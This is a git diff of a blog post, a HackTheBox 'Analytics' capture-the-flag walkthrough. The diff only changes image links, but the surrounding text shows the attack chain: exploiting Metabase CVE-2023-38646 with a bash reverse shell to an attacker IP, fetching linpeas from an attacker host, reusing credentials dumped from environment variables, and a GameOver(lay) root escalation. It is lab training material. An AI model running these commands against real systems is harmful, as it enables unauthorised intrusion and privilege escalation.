@@ -8,7 +8,7 @@ tags:
   - writeup
 description: "Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE"
 canonical_url: "https://medium.com/@hemanthakrishnach/analytics-hackthebox-walkthrough-933c49004220"
-image: "/assets/images/posts/analytics-hackthebox-walkthrough/img-000-8411ea21.png"
+image: "https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-000-8411ea21.png"
 ---
 
 Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE
@@ -17,7 +17,7 @@ Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE
 
 ### Analytics — HackTheBox Walkthrough
 
-Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-000-8411ea21.png)
+Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-000-8411ea21.png)
 
 Room Link: <https://app.hackthebox.com/machines/Analytics>
 
@@ -31,7 +31,7 @@ We kick things off with an Nmap scan:
 ```xml
 nmap -sC -sV <MACHINE_IP>
 ```
-![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-001-a67e80be.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-001-a67e80be.png)
 
 The results reveal two open ports:
 
@@ -41,7 +41,7 @@ The web server is running nginx and the site is titled “Analytical,” which i
 
 ### Virtual Host Enumeration
 
-Navigating to `http://analytical.htb` shows a corporate landing page. We add both virtual hosts to `/etc/hosts`:![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-002-a36cb83d.png)
+Navigating to `http://analytical.htb` shows a corporate landing page. We add both virtual hosts to `/etc/hosts`:![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-002-a36cb83d.png)
 ```kotlin
 10.129.229.224  analytical.htb10.129.229.224  data.analytical.htb
 ```
@@ -50,7 +50,7 @@ The subdomain `data.analytical.htb` reveals a **Metabase** login page. Viewing t
 ```json
 "version":"v0.46.6","tag":"release-x.46.x"
 ```
-![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-003-f8cff480.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-003-f8cff480.png)
 
 This is a critical detail — Metabase v0.46.6 is vulnerable to [**CVE-2023–38646**](https://github.com/m3m0o/metabase-pre-auth-rce-poc), a pre-authentication Remote Code Execution vulnerability.
 
@@ -62,7 +62,7 @@ Metabase exposes an unauthenticated API endpoint at `/api/session/properties`. N
 ```json
 "setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
 ```
-![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-004-85344ebc.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-004-85344ebc.png)
 
 This token is the key to the exploit — it’s only supposed to be active during the initial setup process but remains exposed on unpatched instances.
 
@@ -78,11 +78,11 @@ Then fire the exploit:
 python3 main.py \  -u http://data.analytical.htb \  -t <YOUR_SETUP_TOKEN>\  -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
 ```
 
-We receive a reverse shell as user `metabase` inside what appears to be a Docker container.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-005-18fa5306.png)![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-006-df9fd494.png)
+We receive a reverse shell as user `metabase` inside what appears to be a Docker container.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-005-18fa5306.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-006-df9fd494.png)
 
 ### Lateral Movement — Credentials in Environment Variables
 
-Once inside the container, running `env` dumps the environment variables. Among them:![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-007-3c802a61.png)
+Once inside the container, running `env` dumps the environment variables. Among them:![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-007-3c802a61.png)
 ```ini
 META_USER=metalyticsMETA_PASS=An4lytics_ds20223#
 ```
@@ -92,7 +92,7 @@ These are plaintext credentials stored in the container’s environment. We use 
 ssh metalytics@<MACHINE_IP>
 ```
 
-We’re greeted with an Ubuntu 22.04 shell as `metalytics` and can grab the **user flag** from `~/user.txt`.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-008-618772fb.png)![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-009-d8ab4b61.png)
+We’re greeted with an Ubuntu 22.04 shell as `metalytics` and can grab the **user flag** from `~/user.txt`.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-008-618772fb.png)![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-009-d8ab4b61.png)
 
 ### Privilege Escalation — GameOver(lay) (CVE-2023–2640 / CVE-2023–32629)
 
@@ -108,7 +108,7 @@ On the target, we pull down `linux-exploit-suggester.sh` and run it:
 # Targetcd /tmpwget http://<ATTACKER_IP>/linpeas.shwget http://<ATTACKER_IP>/linux-exploit-suggester.shchmod +x linpeas.sh linux-exploit-suggester.sh./linux-exploit-suggester.sh
 ```
 
-Running `linux-exploit-suggester.sh` on the target highlights **CVE-2023-0386** (OverlayFS suid smuggle) as a candidate. A bit more research leads us to the related **GameOver(lay)** vulnerability chain — CVE-2023-2640 and CVE-2023-32629 — which affects Ubuntu kernels up to 6.2.x.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-010-35e150dc.png)
+Running `linux-exploit-suggester.sh` on the target highlights **CVE-2023-0386** (OverlayFS suid smuggle) as a candidate. A bit more research leads us to the related **GameOver(lay)** vulnerability chain — CVE-2023-2640 and CVE-2023-32629 — which affects Ubuntu kernels up to 6.2.x.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-010-35e150dc.png)
 
 The target’s kernel is **6.2.0** on Ubuntu **22.04**, making it a perfect fit.
 
@@ -131,7 +131,7 @@ The script outputs:
 
 Running `whoami` confirms: **root**.
 
-We navigate to `/root` and read `root.txt` to complete the machine.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-011-ea068623.png)
+We navigate to `/root` and read `root.txt` to complete the machine.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/analytics-hackthebox-walkthrough/img-011-ea068623.png)
 
 ### Key Takeaways
 
